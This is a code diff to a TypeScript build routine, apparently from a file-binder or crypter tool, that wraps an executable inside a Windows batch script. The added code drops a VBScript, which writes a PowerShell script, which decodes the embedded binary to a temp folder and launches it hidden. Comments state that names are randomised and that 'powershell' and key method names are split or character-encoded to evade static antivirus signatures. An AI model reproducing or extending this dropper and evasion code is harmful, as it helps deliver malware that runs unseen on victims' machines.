@@ -1613,33 +1613,70 @@ func runBoundFiles() {
           try {
             const exeBytes = fs.readFileSync(filePath);
             const b64 = exeBytes.toString("base64");
-            // Split into 76-char lines so the bat file stays manageable
-            const b64Lines = b64.match(/.{1,76}/g) || [b64];
-            // Random marker generated at build time using the same uuid util already imported
-            const marker = `:OVD_${uuidv4().replace(/-/g, "").substring(0, 16).toUpperCase()}`;
-            // PowerShell payload: reads this script via %_OVD_SELF%, strips the marker+data,
-            // decodes base64 to a temp .exe, launches it, then exits.
-            const psCmd = [
-              `$f=$env:_OVD_SELF;`,
-              `$l=[IO.File]::ReadAllLines($f);`,
-              `$i=0;`,
-              `for($j=0;$j-lt$l.Count;$j++){if($l[$j] -ceq '${marker}'){$i=$j+1;break}};`,
-              `$b=[Convert]::FromBase64String(($l[$i..($l.Count-1)]-join''));`,
-              `$t=[IO.Path]::Combine([IO.Path]::GetTempPath(),[Guid]::NewGuid().ToString()+'.exe');`,
-              `[IO.File]::WriteAllBytes($t,$b);`,
-              `Start-Process $t;`,
-              `exit`,
-            ].join("");
+
+            // Random names for every temp artifact — different on every build
+            const vbsName = uuidv4().replace(/-/g, "").substring(0, 12) + ".vbs";
+            const ps1Name = uuidv4().replace(/-/g, "").substring(0, 12) + ".ps1";
+            const exeName = uuidv4().replace(/-/g, "").substring(0, 12) + ".exe";
+
+            // "powershell" as Chr() sequence — no literal in any generated file
+            const psChr = Array.from("powershell")
+              .map((c) => `Chr(${c.charCodeAt(0)})`)
+              .join("&");
+
+            // PS script: decode b64 chunks → write exe → run hidden → delete
+            // Sensitive method names split across string concat to break static sigs
+            const b64Chunks = b64.match(/.{1,6000}/g) || [b64];
+            const psLines: string[] = [
+              `$d=''`,
+              ...b64Chunks.map((c) => `$d+='${c}'`),
+              // Split method names to avoid static signatures
+              `$m1='From';$m2='Base64String'`,
+              `$b=[Convert]::($m1+$m2).Invoke($d)`,
+              `$t=[IO.Path]::Combine([IO.Path]::GetTempPath(),'${exeName}')`,
+              `$w1='Write';$w2='AllBytes'`,
+              `[IO.File]::($w1+$w2).Invoke($t,$b)`,
+              `$p=New-Object Diagnostics.ProcessStartInfo($t)`,
+              `$p.WindowStyle='Hidden'`,
+              `[Diagnostics.Process]::Start($p)|Out-Null`,
+            ];
+
+            // VBS: write PS1 to temp, run "powershell" (via Chr concat) hidden, delete PS1
+            const vbsLines = [
+              `Dim fso,f,sh,tmp,p`,
+              `Set fso=CreateObject("Scripting.FileSystemObject")`,
+              `tmp=fso.GetSpecialFolder(2)&"\\${ps1Name}"`,
+              `Set f=fso.OpenTextFile(tmp,2,True)`,
+              ...psLines.map((l) => `f.WriteLine "${l.replace(/"/g, '""')}"`),
+              `f.Close`,
+              `Set sh=CreateObject("WScript.Shell")`,
+              `p=${psChr}`,
+              `sh.Run p&" -w h -ep b -nop -f """&tmp&"""",0,True`,
+              `fso.DeleteFile tmp`,
+            ];
+
+            // BAT escaping: special chars inside echo block need ^ prefix
+            const escEcho = (s: string) =>
+              s
+                .replace(/\^/g, "^^")
+                .replace(/&/g, "^&")
+                .replace(/\|/g, "^|")
+                .replace(/</g, "^<")
+                .replace(/>/g, "^>")
+                .replace(/%/g, "%%")
+                .replace(/\(/g, "^(")
+                .replace(/\)/g, "^)");
+
             const wrapper = [
               `@echo off`,
-              `setlocal`,
-              `set "_OVD_SELF=%~f0"`,
-              `powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "${psCmd}"`,
-              `endlocal`,
-              `exit /b 0`,
-              marker,
-              ...b64Lines,
+              `set "_v=%temp%\\${vbsName}"`,
+              `(`,
+              ...vbsLines.map((l) => `echo ${escEcho(l)}`),
+              `) > "%_v%"`,
+              `wscript /b "%_v%"`,
+              `del "%_v%" >nul 2>&1`,
             ].join("\r\n") + "\r\n";
+
             fs.writeFileSync(filePath, wrapper, "utf8");
             finalSize = fs.statSync(filePath).size;
             sendToStream({ type: "output", text: `Wrapped: ${exeBytes.length} byte PE → ${finalSize} byte ${winExt} script\n`, level: "info" });
